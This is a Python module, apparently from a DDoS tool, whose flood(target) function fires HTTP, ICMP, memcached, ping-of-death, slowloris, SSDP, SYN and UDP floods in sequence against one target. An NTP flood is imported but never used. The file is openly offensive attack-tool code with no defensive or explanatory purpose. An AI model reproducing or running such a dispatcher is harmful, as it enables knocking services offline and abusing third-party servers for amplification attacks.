from bin.attacks.http import flood as http
from bin.attacks.icmp import flood as icmp
from bin.attacks.memcached import flood as memcached
from bin.attacks.ntp import flood as ntp
from bin.attacks.ping_of_death import flood as ping_of_death
from bin.attacks.slowloris import flood as slowloris
from bin.attacks.ssdp import flood as ssdp
from bin.attacks.syn import flood as syn
from bin.attacks.udp import flood as udp


def flood(target):
    http(target)
    icmp(target)
    memcached(target)
    ping_of_death(target)
    slowloris(target)
    ssdp(target)
    syn(target)
    udp(target)
